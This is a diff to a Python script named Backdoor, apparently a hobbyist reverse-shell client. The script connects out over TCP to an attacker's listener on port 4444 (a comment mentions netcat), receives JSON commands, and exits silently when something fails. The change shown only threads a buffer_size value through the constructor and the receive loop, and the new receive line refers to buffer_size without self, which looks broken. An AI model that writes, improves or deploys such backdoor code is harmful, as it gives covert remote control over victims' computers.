@@ -9,7 +9,7 @@ import base64, json, os, shutil, socket, subprocess, sys
 #netcat --veryverbose -listen -port ####
 
 class Backdoor:
-    def __init__ (self, ip, port): #constructor method
+    def __init__ (self, ip, port, buffer_size): #constructor method
         self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
         
@@ -37,7 +37,7 @@ class Backdoor:
         json_data = ""
         while True: #loop to execute until entire stream of data is received
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(buffer_size)
                 return json.loads(json_data) #attempt to unpack json converted TCP stream
             except ValueError: #ValueError unterminated string will be received if entire data set is not received
                 continue
@@ -83,10 +83,10 @@ class Backdoor:
 #buffer_size = int(raw_input("Enter buffer size: "))
 ip = " "
 port = 4444
-#buffer_size = 1024
+buffer_size = 1024
 
 try:
-    my_backdoor = Backdoor(ip, port)
+    my_backdoor = Backdoor(ip, port, buffer_size)
     my_backdoor.run()
 except Exception: #Exception = any type of error that occurs when trying to run program
     sys.exit() #exit quietly    
